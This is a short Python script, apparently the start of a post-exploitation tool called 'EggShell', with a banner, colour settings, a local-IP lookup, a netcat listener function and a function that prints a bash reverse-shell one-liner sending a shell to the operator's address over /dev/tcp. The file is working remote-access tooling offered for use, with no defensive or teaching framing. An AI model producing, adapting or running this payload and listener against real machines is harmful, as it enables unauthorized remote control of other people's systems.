import sys,base64,os,socket

banner_text =""" ______     __  __     __   __    
/\  ___\   /\ \_\ \   /\ "-.\ \   
\ \___  \  \ \____ \  \ \ \-.  \  
 \/\_____\  \/\_____\  \ \_\\\\"\_\ 
  \/_____/   \/_____/   \/_/ \/_/ 
  """
WINDOWS = sys.platform.startswith('win')
#colors
GREEN = '' if WINDOWS else '\033[1;92m'
RED = '' if WINDOWS else '\033[1;91m'
WHITE = '' if WINDOWS else '\033[0;97m'
GREEN_THIN = '' if WINDOWS else '\033[0;92m'
CYAN = '' if WINDOWS else '\033[0;96m'
YELLOW = '' if WINDOWS else '\033[0;93m'
ENDC = '' if WINDOWS else '\033[0m'
UNDERLINE_GREEN = '' if WINDOWS else '\033[4;92m'
WHITEBU = '' if WINDOWS else '\033[1;4m'
COLOR_INFO = '' if WINDOWS else '\033[0;36m'
NES = ('SELECT' if WINDOWS else '\033[0;32m')+"EggShell"+WHITE+"> "
#cmds
CMD_CLEAR = 'cls' if WINDOWS else 'clear'
CMD_PWD = 'cd' if WINDOWS else 'pwd'
CMD_LS = 'dir' if WINDOWS else 'ls'
WINDOWS = sys.platform.startswith('win')
CMD_CLEAR = 'cls' if WINDOWS else 'clear'

def clear():
	os.system(CMD_CLEAR)

def clearB():
	os.system(CMD_CLEAR)
	print(GREEN+banner_text)

def getip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
        host = host
    except:
        host = "127.0.0.1"
    return host
def listen(port):
	print('listening on port '+str(port))
	print('press ctrl c to stop')
	os.system('nc -l '+str(port))
def createsimplepayload(port):#let user put port in
	print('nohup bash &> /dev/tcp/'+getip()+'/'+str(port)+' 0>&1 &')
def about():
	print('Version 1.0\nCreated by мишапов (@Mikhail Semenov)')
